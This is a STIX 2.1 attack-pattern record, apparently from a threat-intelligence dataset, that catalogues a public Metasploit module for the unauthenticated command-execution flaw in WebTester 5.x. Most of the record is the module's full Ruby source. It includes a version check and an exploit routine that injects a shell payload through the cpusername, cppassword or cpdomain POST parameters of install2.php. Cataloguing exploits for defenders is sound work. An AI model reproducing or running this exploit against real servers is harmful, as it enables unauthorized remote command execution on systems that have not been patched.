{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--85c953db-c343-4b38-b789-a945e4fc342a",
    "created": "2024-08-14T17:12:23.966794Z",
    "modified": "2024-08-14T17:12:23.966798Z",
    "name": "\"WebTester 5.x Command Execution\"",
    "description": " This module exploits a command execution vulnerability in WebTester version 5.x. The 'install2.php' file allows unauthenticated users to execute arbitrary commands in the 'cpusername', 'cppassword' and 'cpdomain' parameters.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/webtester_exec.rb",
            "external_id": "webtester_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://sourceforge.net/p/webtesteronline/bugs/3/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"WebTester 5.x Command Execution\",\n      'Description'    => %q{\n          This module exploits a command execution vulnerability in WebTester\n        version 5.x. The 'install2.php' file allows unauthenticated users to\n        execute arbitrary commands in the 'cpusername', 'cppassword' and\n        'cpdomain' parameters.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'bcoles'  # Metasploit\n        ],\n      'References'     =>\n        [\n          ['OSVDB',    '98750'],\n          ['URL',      'https://sourceforge.net/p/webtesteronline/bugs/3/']\n        ],\n      'Payload'        =>\n        {\n            'Space'       => 8190, # Just a big value, injection on POST variable\n            'DisableNops' => true,\n            'BadChars'   => \"\\x00\"\n        },\n      'Arch'           => ARCH_CMD,\n      'Platform'       => 'unix',\n      'Targets'        =>\n        [\n          # Tested on WebTester v5.1.20101016\n          [ 'WebTester version 5.x', { 'auto' => true } ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-10-17',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The base path to WebTester', '/webtester5/'])\n        ])\n  end\n\n  #\n  # Checks if target is running WebTester version 5.x\n  #\n  def check\n    res = send_request_raw({ 'uri' => normalize_uri(target_uri.path) })\n\n    if not res\n      vprint_error(\"Connection timed out\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    if res.body =~ /Eppler Software/\n      if res.body =~ / - v5\\.1\\.20101016/\n        vprint_status(\"Found version: 5.1.20101016\")\n        return Exploit::CheckCode::Appears\n      elsif res.body =~ / - v(5\\.[\\d\\.]+)/\n        vprint_status(\"Found version: #{$1}\")\n        return Exploit::CheckCode::Appears\n      else\n        return Exploit::CheckCode::Detected\n      end\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    vuln_params = [\n      'cpusername',\n      'cppassword',\n      'cpdomain'\n    ]\n    print_status(\"Sending payload (#{payload.encoded.length} bytes)...\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, 'install2.php'),\n      'vars_post'  => {\n        'createdb' => 'yes',\n        'cpanel'   => 'yes',\n        \"#{vuln_params.sample}\" => \"';#{payload.encoded} #\"\n      }\n    })\n\n    if not res\n      fail_with(Failure::Unknown, \"#{peer} - Request timed out\")\n    elsif res.code == 200 and res.body =~ /Failed to connect to database server/\n      print_good(\"Payload sent successfully\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Something went wrong\")\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-10-17",
    "x_mitre_platforms": [
        "unix'"
    ]
}